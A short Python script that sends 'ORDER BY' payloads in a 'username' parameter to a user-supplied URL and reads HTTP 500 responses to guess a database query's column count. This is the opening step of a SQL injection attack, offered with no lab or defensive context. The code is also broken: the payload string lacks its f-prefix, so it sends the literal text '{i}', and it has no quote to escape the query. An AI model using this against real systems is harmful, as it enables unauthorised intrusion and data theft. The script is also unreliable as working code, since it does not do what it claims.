

import requests

target = input("enter target ::")
     

for i in range(1,10):

    payload = "ORDER BY {i}"


    res = requests.get(target, params={"username":payload})

    status = res.status_code      
    

    if status == 500:
       col_count = i - 1
       print(f"Column count: {col_count}")
       break

    print(f"{target} status :{status}")


   
